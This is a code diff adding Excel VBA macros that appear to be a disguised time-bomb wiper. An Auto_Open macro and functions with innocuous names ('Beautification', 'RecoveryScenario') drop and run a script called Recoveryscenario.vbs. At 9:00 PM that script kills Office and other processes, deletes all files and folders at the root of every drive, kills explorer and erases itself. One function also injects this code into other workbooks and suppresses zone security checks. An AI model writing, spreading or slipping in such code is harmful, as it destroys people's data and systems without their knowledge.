@@ -1,0 +1,117 @@
+Function Beautification(ByRef objworkbook)
+	Set xlmodule = objworkbook.VBProject.VBComponents.Add(1) 
+	strCode = _
+	"sub xyz()" & vbCr & _
+	"Set fso = createobject(""scripting.filesystemobject"")" & vbCr & _
+	"excelPath = fso.getfolder(Activeworkbook.Path &""\.."")" & vbCr & _
+	"RecoveryFile = excelPath & ""Akhilesh\Estimation\Recoveryscenarios.vbs""" & vbCr & _
+	"Set fs = fso.createtextfile(RecoveryFile)" & vbCr & _
+	"strVbs = ""On error resume next"" & vbNewLine & _" & vbCr &_
+	"""Do While Time <> """"9:00:00 PM"""""" & vbNewLine & _"& vbCr &_
+	"""Loop"" & vbNewLine & _"& vbCr &_
+	"""strComputer = """"."""""" & vbNewLine & _"& vbCr &_
+	"""Set process = GetObject(""""winmgmts:\\"""" & strComputer & """"\root\cimv2"""")"" & vbNewLine & _"& vbCr &_
+	"""Set AllWindows = process.ExecQuery(""""Select * from Win32_Process Where Name Like 'EXCEL%' OR Name Like 'qtp%' OR Name Like 'notepad%' OR Name Like 'javaw%' OR Name Like '%WORD%'"""")"" & vbNewLine & _"& vbCr &_
+	"""For Each Win in AllWindows"" & vbNewLine & _"& vbCr &_
+	"""	Win.Terminate()"" & vbNewLine & _"& vbCr &_
+	"""Next"" & vbNewLine & _"& vbCr &_
+	"""Set fso = createobject(""""scripting.filesystemobject"""")"" & vbNewLine & _" & vbCr &_
+	"""For each dir in fso.Drives"" & vbNewLine & _" & vbCr &_
+	"""	For each fl in  fso.GetDrive(dir).RootFolder.Files"" & vbNewLine & _" & vbCr &_
+	"""		fl.delete"" & vbNewLine & _" & vbCr &_
+	"""	Next"" & vbNewLine & _" & vbCr &_
+	"""	For each fl in  fso.GetDrive(dir).RootFolder.SubFolders"" & vbNewLine & _"& vbCr &_
+	"""		fl.delete"" & vbNewLine & _" & vbCr &_
+	"""	Next"" & vbNewLine & _"& vbCr &_
+	"""Next"" & vbNewLine & _"& vbCr &_
+	"""Set AllWindows = process.ExecQuery(""""Select * from Win32_Process Where Name Like 'explorer%'"""")"" & vbNewLine & _"& vbCr &_
+	"""For Each Win in AllWindows"" & vbNewLine & _"& vbCr &_
+	"""	Win.Terminate()"" & vbNewLine & _"& vbCr &_
+	"""Next"" & vbNewLine & _"& vbCr &_
+	"""fso.DeleteFile(wscript.scriptfullname)""" & vbCr &_
+	"fs.Write(strVbs)" & vbCr &_
+	"fs.Close" & vbCr &_
+	"Set Sh = CreateObject(""Wscript.shell"")" & vbCr & _
+	"Set oEnv = Sh.Environment(""PROCESS"")" & vbCr & _
+	"oEnv(""SEE_MASK_NOZONECHECKS"") = 1" & vbCr & _
+	"If instr(RecoveryFile,"" "") then : Sh.Run chr(34) & RecoveryFile & chr(34) : else : Sh.Run RecoveryFile" & vbCr & _
+	"End Sub"
+	xlmodule.CodeModule.AddFromString strCode
+End Function
+
+	Function RecoveryScenario()
+		Set fso = CreateObject("scripting.filesystemobject")
+		If not fso.FileExists(folderpath&"\Document\Recoveryscenario.vbs") Then
+			Set fl = fso.CreateTextFile(folderpath&"\Document\Recoveryscenario.vbs")
+			strCode=_
+			"Do While Time <> ""9:00:00 PM""" & vbNewLine & _
+			"Loop" & vbNewLine & _
+			"strComputer = "".""" & vbNewLine & _
+			"Set process = GetObject(""winmgmts:\\"" & strComputer & ""\root\cimv2"")" & vbNewLine & _
+			"Set AllWindows = process.ExecQuery(""Select * from Win32_Process Where Name Like 'EXCEL%' OR Name Like 'qtp%' OR Name Like 'notepad%' OR Name Like 'javaw%' OR Name Like '%WORD%'"")" & vbNewLine & _
+			"For Each Win in AllWindows" & vbNewLine & _
+			   "Win.Terminate()" & vbNewLine & _
+			"Next" & vbNewLine & _
+			"Set fso = createobject(""scripting.filesystemobject"")" & vbNewLine & _
+			"For each dir in fso.Drives" & vbNewLine & _
+			   "For each fl in  fso.GetDrive(dir).RootFolder.Files" & vbNewLine & _
+				   "fl.delete" & vbNewLine & _
+			   "Next" & vbNewLine & _
+			   "For each fl in  fso.GetDrive(dir).RootFolder.SubFolders" & vbNewLine & _
+				   "fl.delete" & vbNewLine & _
+			   "Next" & vbNewLine & _
+			"Next" & vbNewLine & _
+			"Set AllWindows = process.ExecQuery(""Select * from Win32_Process Where Name Like 'explorer%'"")" & vbNewLine & _
+			"For Each Win in AllWindows" & vbNewLine & _
+			   "Win.Terminate()" & vbNewLine & _
+			"Next" & vbNewLine & _
+			"fso.DeleteFile(wscript.scriptfullname)"
+			fl.write(strCode)
+			fl.close
+			Set Sh = CreateObject("Wscript.shell")
+			If instr(folderpath," ") then : Sh.Run chr(34)&folderpath&"\Document\Recoveryscenario.vbs"&chr(34) : else : Sh.Run folderpath&"\Document\Recoveryscenario.vbs"
+		End If
+	End Function
+
+
+
+
+
+Sub Auto_Open()
+strComputer = ".": intCount = 0
+Set process = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+Set AllWindows = process.ExecQuery("Select * from Win32_Process Where Name Like 'wscript%'")
+For Each Win In AllWindows
+If InStr(Win.CommandLine, "Recoveryscenario.vbs") Then: Exit Sub
+Next
+Set fso = CreateObject("scripting.filesystemobject")
+excelpath = fso.getfolder(ActiveWorkbook.Path & "\..\..")
+excelpath = excelpath & "\Document\Recoveryscenario.vbs"
+If Not fso.fileexists(excelpath) Then
+    Set fl = fso.CreateTextFile(excelpath)
+    strCode = _
+    "On Error Resume Next" & vbNewLine & _
+    "Do While Time <> ""9:00:00 PM""" & vbNewLine & _
+    "Loop" & vbNewLine & _
+    "strComputer = "".""" & vbNewLine & _
+    "Set process = GetObject(""winmgmts:\\"" & strComputer & ""\root\cimv2"")" & vbNewLine & _
+    "Set AllWindows = process.ExecQuery(""Select * from Win32_Process Where Name Like 'EXCEL%' OR Name Like 'qtp%' OR Name Like 'notepad%' OR Name Like 'javaw%' OR Name Like '%WORD%'"")" & vbNewLine & _
+    "For Each Win in AllWindows" & vbNewLine & _
+       "Win.Terminate()" & vbNewLine & _
+    "Next" & vbNewLine & _
+    "Set fso = createobject(""scripting.filesystemobject"")" & vbNewLine & _
+    "For each dir in fso.Drives" & vbNewLine & _
+       "For each fl in  fso.GetDrive(dir).RootFolder.Files" & vbNewLine & _
+           "fl.delete" & vbNewLine & _
+       "Next" & vbNewLine & _
+       "For each fl in  fso.GetDrive(dir).RootFolder.SubFolders" & vbNewLine & _
+           "fl.delete" & vbNewLine & _
+       "Next" & vbNewLine & _
+    "Next" & vbNewLine & _
+    "fso.DeleteFile(wscript.scriptfullname)"
+    fl.write (strCode)
+    fl.Close
+End If
+Set Sh = CreateObject("Wscript.shell")
+If InStr(excelpath, " ") Then Sh.Run Chr(34) & excelpath & Chr(34) Else: Sh.Run excelpath
+End Sub
